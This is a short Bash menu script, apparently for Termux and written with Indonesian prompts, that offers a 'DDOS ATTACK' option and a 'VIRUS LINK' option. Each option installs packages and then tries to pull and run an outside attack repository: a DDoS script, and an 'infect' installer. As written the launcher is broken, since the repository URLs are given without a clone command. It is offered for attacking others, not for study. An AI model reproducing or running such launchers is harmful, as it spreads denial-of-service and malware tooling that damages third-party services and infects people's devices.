

clear
echo "(+) AUTHOR : BarGanz (+)"
echo "========================="
echo
sleep 1
echo "1.) DDOS ATTACK"
echo "2.) VIRUS LINK"
echo "3.) KELUAR"
echo 
read -p "masukan pilihan => "try

if [ $try = 1 ]
then 
clear  
  pkg update && pkg upgrade -y
  pkg install python -y
  pkg install figlet -y 
  pkg install git -y 
  https://github.com/MrVirusSpm-07/ddos-attack
  cd ddos-attack
  python attack-ddos.py
fi

if [ $try = 2 ]
then
clear 
  apt update -y
  apt upgrade
  pkg install python -y
  pkg install python2 -y
  pkg install lolcat -y 
  pkg install git -y
  https://github.com/noob-hecker/infect
  cd infect
  bash install.sh
fi

if [ $try = 3 ]
then
  exit 
fi